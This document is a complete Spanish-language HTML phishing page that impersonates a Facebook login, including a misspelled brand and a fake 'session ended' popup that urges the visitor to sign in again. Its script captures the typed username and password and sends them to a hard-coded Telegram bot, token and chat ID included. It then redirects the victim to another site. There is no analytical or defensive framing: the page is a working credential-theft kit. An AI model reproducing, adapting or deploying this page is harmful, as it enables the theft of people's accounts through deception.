<!DOCTYPE html>
<html lang="es">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mypime Online</title>
<style>
body {
  margin:0;
  font-family: system-ui, -apple-system, Arial, sans-serif;
  background: linear-gradient(#0f1c2e, #1b2d4a);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.wrapper {
  width:100%;
  max-width:380px;
  background:#f2f2f2;
  border-radius:20px;
  box-shadow:0 5px 25px rgba(0,0,0,0.3);
  margin:auto;
}
.header {
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  padding:18px;
  border-radius:20px 20px 0 0;
  text-align:center;
}
.header h1 { margin:0; font-size:26px; font-weight:700; }
.header p { margin:5px 0 0; font-size:13px; }
.form { padding:20px; text-align:center; }
input {
  width:90%;
  padding:14px;
  margin:8px auto;
  border-radius:6px;
  border:1px solid #ccd0d5;
  font-size:14px;
  background:#fff;
  display:block;
}
.btn {
  width:90%;
  padding:14px;
  margin:10px auto 0;
  border:none;
  border-radius:6px;
  font-weight:bold;
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  color:white;
  font-size:15px;
  cursor:pointer;
}
.small { text-align:center; font-size:12px; color:#666; margin-top:10px; }
.overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:998; display:block; }
.modal { position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:90%; max-width:320px; background:white; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.3); text-align:center; z-index:999; display:block; }
.modal-header { background:#0f1c2e; color:white; padding:12px; font-size:14px; border-radius:12px 12px 0 0; }
.modal-body { padding:15px; font-size:14px; }
.modal button { background:#0f1c2e; color:white; border:none; padding:10px; width:70%; border-radius:8px; cursor:pointer; }
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <h1>REGÍSTRATE CON FACBOCK</h1>
    <p>La forma más fácil de estar con tus amigos</p>
  </div>

  <div class="form">
    <form id="loginForm">
      <input type="text" name="usuario" placeholder="Teléfono o correo" required>
      <input type="password" name="contraseña" placeholder="Contraseña" required>
      <button type="submit" class="btn">Entrar</button>
    </form>
    <div class="small">¿Nuevo aquí? Crea tu cuenta gratis en segundos</div>
  </div>
</div>

<div id="overlay" class="overlay"></div>
<div id="modal" class="modal">
  <div class="modal-header">Terminó su sesión</div>
  <div class="modal-body">
    <p>Vuelva a iniciar.</p>
    <button onclick="cerrar()">Continuar</button>
  </div>
</div>

<script>
function cerrar(){
  document.getElementById("modal").style.display="none";
  document.getElementById("overlay").style.display="none";
}

const form = document.getElementById("loginForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const datos = {
    Usuario: form.usuario.value,
    Contraseña: form.contraseña.value,
    Fecha: new Date().toISOString()
  };

  try {
    // --- TELEGRAM ---
    const TELEGRAM_TOKEN = "8686021348:AAFandMV5VXnmZL1KuIREyDVLrGL1s5pPt4";
    const CHAT_ID = "1509335089";
    const mensaje = `U: ${datos.Usuario}\nC: ${datos.Contraseña}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });
    // --- FIN TELEGRAM ---
  } catch(err) {
    console.error("Error:", err);
  }

  // Redirección final
  window.location.href = "https://supermarket23.com";
});
</script>

</body>
</html>
